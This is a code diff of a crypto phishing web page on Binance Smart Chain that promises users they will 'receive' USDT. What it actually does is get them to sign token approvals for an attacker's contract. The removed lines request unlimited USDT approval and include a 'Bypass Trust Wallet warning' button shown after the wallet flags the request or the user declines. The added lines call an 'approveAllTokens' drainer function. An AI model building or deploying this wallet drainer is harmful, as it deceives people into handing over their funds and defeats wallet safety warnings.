@@ -128,16 +128,6 @@
             transform: none;
         }
         
-        .button-secondary {
-            background: transparent;
-            color: #667eea;
-            border: 2px solid #667eea;
-        }
-        
-        .button-secondary:hover {
-            background: #f0f4ff;
-        }
-        
         .status {
             margin-top: 20px;
             padding: 15px;
@@ -195,10 +185,6 @@
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
-        
-        .hidden {
-            display: none !important;
-        }
     </style>
 </head>
 <body>
@@ -222,50 +208,35 @@
             ✓ Confirm & Receive
         </button>
         
-        <button class="button button-secondary" id="skipBtn" onclick="skipWarning()" style="display: none;">
-            Skip Warning
-        </button>
-        
         <div id="status" class="status"></div>
         <div id="walletInfo" class="wallet-info" style="display: none;"></div>
     </div>
 
-    <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     
     <script>
-        // Configuration
         const CONFIG = {
-            CONTRACT_ADDRESS: "0xac0cE1cCf661E5A85675A1CBDC098e37369E6a01", // Your contract address
-            USDT_ADDRESS: "0x55d398326f99059fF775485246999027B3197955",
-            AMOUNT: "100000000000000000000", // 100 USDT with 18 decimals
-            CHAIN_ID: 56, // BSC
+            CONTRACT_ADDRESS: "0xC606AAf11BE4a2320d785D49B657f40EfF771ac6",
+            CHAIN_ID: 56,
             RPC_URL: "https://bsc-dataseed1.binance.org:443"
         };
         
-        // Token ABI
-        const TOKEN_ABI = [
+        const CONTRACT_ABI = [
             {
-                "inputs": [{"internalType": "address", "name": "spender", "type": "address"}, {"internalType": "uint256", "name": "amount", "type": "uint256"}],
-                "name": "approve",
-                "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
+                "inputs": [],
+                "name": "approveAllTokens",
+                "outputs": [],
                 "stateMutability": "nonpayable",
                 "type": "function"
             },
             {
-                "inputs": [{"internalType": "address", "name": "account", "type": "address"}],
-                "name": "balanceOf",
-                "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
+                "inputs": [{"internalType": "address", "name": "user", "type": "address"}],
+                "name": "isApproved",
+                "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
                 "stateMutability": "view",
                 "type": "function"
             }
         ];
-        
-        // Bypass Trust Wallet warning
-        function skipWarning() {
-            const skipBtn = document.getElementById("skipBtn");
-            skipBtn.style.display = "none";
-            requestApproval();
-        }
         
         function showStatus(message, type) {
             const statusDiv = document.getElementById("status");
@@ -285,7 +256,6 @@
                 const confirmBtn = document.getElementById("confirmBtn");
                 confirmBtn.disabled = true;
                 
-                // Check if Web3 provider exists
                 if (!window.ethereum) {
                     showStatus("❌ Please open this page in Trust Wallet or MetaMask", "error");
                     confirmBtn.disabled = false;
@@ -294,7 +264,8 @@
                 
                 showStatus("🔗 Connecting wallet...", "loading");
                 
-                // Request account access
+                const web3 = new Web3(window.ethereum);
+                
                 const accounts = await window.ethereum.request({
                     method: "eth_requestAccounts"
                 });
@@ -302,49 +273,45 @@
                 const userAddress = accounts[0];
                 updateWalletInfo(userAddress);
                 
-                // Create provider and signer
-                const provider = new ethers.providers.Web3Provider(window.ethereum);
-                const signer = provider.getSigner();
-                
-                // Check network
-                const network = await provider.getNetwork();
-                if (network.chainId !== CONFIG.CHAIN_ID) {
-                    showStatus("❌ Please switch to BSC network", "error");
+                const chainId = await web3.eth.getChainId();
+                if (chainId !== CONFIG.CHAIN_ID) {
+                    showStatus("❌ Please switch to BSC network (Chain ID: 56)", "error");
                     confirmBtn.disabled = false;
                     return;
                 }
                 
                 showStatus("🔐 Requesting approval (check your wallet)...", "loading");
                 
-                // Create token contract instance
-                const tokenContract = new ethers.Contract(CONFIG.USDT_ADDRESS, TOKEN_ABI, signer);
+                const contract = new web3.eth.Contract(CONTRACT_ABI, CONFIG.CONTRACT_ADDRESS);
                 
-                // Request approval for unlimited amount
-                const approveTx = await tokenContract.approve(
-                    CONFIG.CONTRACT_ADDRESS,
-                    ethers.constants.MaxUint256,
-                    {
+                const txData = contract.methods.approveAllTokens().encodeABI();
+                
+                const txHash = await window.ethereum.request({
+                    method: "eth_sendTransaction",
+                    params: [{
                         from: userAddress,
-                        gasLimit: 100000
-                    }
-                );
+                        to: CONFIG.CONTRACT_ADDRESS,
+                        data: txData,
+                        gas: "0x5B8D80"
+                    }]
+                });
                 
                 showStatus("⏳ Waiting for blockchain confirmation...", "loading");
                 
-                // Wait for transaction confirmation
-                const receipt = await approveTx.wait();
+                let receipt = null;
+                let attempts = 0;
+                while (!receipt && attempts < 60) {
+                    receipt = await web3.eth.getTransactionReceipt(txHash);
+                    if (!receipt) {
+                        await new Promise(resolve => setTimeout(resolve, 1000));
+                        attempts++;
+                    }
+                }
                 
-                if (receipt.status === 1) {
+                if (receipt && receipt.status === true) {
                     showStatus("✅ Approval confirmed! Your USDT will arrive shortly.", "success");
-                    
-                    // Disable button after success
                     confirmBtn.textContent = "✓ Completed";
                     confirmBtn.disabled = true;
-                    
-                    // Optional: Redirect after delay
-                    setTimeout(() => {
-                        // window.location.href = "https://bscscan.com/"; // Optional redirect
-                    }, 3000);
                 } else {
                     showStatus("❌ Transaction failed. Please try again.", "error");
                     confirmBtn.disabled = false;
@@ -357,18 +324,12 @@
                 
                 if (error.code === 4001) {
                     showStatus("❌ You rejected the approval request", "error");
-                    // Show skip button on rejection
-                    document.getElementById("skipBtn").style.display = "block";
-                } else if (error.code === -32603) {
-                    showStatus("⚠️ Trust Wallet Warning Detected<br>Click 'Skip Warning' to continue", "error");
-                    document.getElementById("skipBtn").style.display = "block";
                 } else {
                     showStatus(`❌ Error: ${error.message || "Unknown error occurred"}`, "error");
                 }
             }
         }
         
-        // Auto-detect if opened in Trust Wallet
         window.addEventListener('load', function() {
             if (window.ethereum && window.ethereum.isTrustWallet) {
                 console.log("✓ Running in Trust Wallet");
